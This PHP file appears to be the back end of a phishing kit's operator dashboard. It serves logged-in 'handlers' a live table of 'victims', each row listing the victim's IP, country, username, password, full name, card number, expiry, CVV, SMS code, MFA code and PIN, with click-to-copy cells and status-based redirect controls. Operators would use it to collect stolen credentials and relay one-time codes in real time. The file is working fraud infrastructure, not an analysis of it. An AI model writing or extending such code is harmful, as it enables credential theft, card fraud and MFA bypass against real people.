<?php
include 'config.php';
include 'connect.php';
date_default_timezone_set('Europe/Dublin');
session_start();

if (!isset($_SESSION['loggedin'])) {
    http_response_code(403);
    exit(json_encode(['error' => 'Unauthorized access']));
}

// Update handler's last seen timestamp
if ($_SESSION['role'] === "Handler") {
    $stmt = $conn->prepare("UPDATE handlers SET lastseen = ? WHERE username = ?");
    $new_lastseen = time();
    $stmt->bind_param('is', $new_lastseen, $_SESSION['username']);
    $stmt->execute();
    $stmt->close();
}

// Function to generate victim HTML row
function generateVictimRow($value) {
    $badge = status_to_badge($value['status'], "status.json");
    $lastseen = check_online($value['lastseen']);
    $lastseen = "<td style='vertical-align:middle;'>$lastseen</td>";

    // Assigning all the values to variables with clickable fields handled
$columns = [
		'id' => "<td style='vertical-align:middle; color: black; font-size: 14px; font-weight: 500;' scope='row'>{$value['id']}</td>",
		'handler' => "<td style='vertical-align:middle; color: black; font-size: 14px; font-weight: 500;'>{$value['handler']}</td>",
		'ip' => "<td style='vertical-align:middle; color: black; font-size: 14px;'>{$value['ip']}</td>",
        'useragent' => "<td style='vertical-align:middle; text-align: center;'>" . useragent_to_browser($value['useragent']) . "</td>",
        'country' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['country']}</td>",
        'user' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['user']}</td>",
        'pass' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['pass']}</td>",
        'smscode' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['smscode']}</td>",
        'fullname' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['fullname']}</td>",
		'card' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['card']}</td>",
		'exp' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['exp']}</td>",
		'cvv' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['cvv']}</td>",
		'smscode' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['smscode']}</td>",
		'mfa' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['mfa']}</td>",
		'pin' => "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer;' title='Click to copy'>{$value['pin']}</td>",
	    'status' => "<td style='white-space: nowrap; vertical-align:middle; color: black; font-size: 15px;white-space: nowrap;'>$badge</td>"
];


    // Combine all the columns in the original order
    $rowHtml = $columns['id'] . $lastseen . $columns['ip'] . $columns['country'] .
               $columns['user'] . $columns['pass'] . $columns['fullname'] . 
               $columns['card'] . $columns['exp'] . $columns['cvv'] . $columns['smscode'] .
			   $columns['mfa'] . $columns['status'];
    return $rowHtml;
}

// Combined Query: Fetch all victims and mark removed ones
$stmt = $conn->prepare("SELECT * FROM victims");
$stmt->execute();
$result = $stmt->get_result();

$output = [];
$removed_ids = [];

while ($value = $result->fetch_assoc()) {
    if ($value['is_removed'] == 1) {
        $removed_ids[] = $value['id'];
    } else {
        $rowHtml = generateVictimRow($value);
        $output[] = [
            'id' => 'row' . $value['id'],
            'redirects' => redirects_btn($value['status'], "status.json"),
            'buzzed' => $value['buzzed'],
            'info' => base64_encode($rowHtml)
        ];
    }
}
$stmt->close();

// Return the JSON response
echo json_encode([
    'total_visits' => total_visits($conn),
    'total_victims' => total_victims($conn),
    'online_victims' => online_victims($conn),
    'active_handlers' => online_handlers($conn),
    'removed_ids' => $removed_ids,
    'victims' => $output
]);
?>
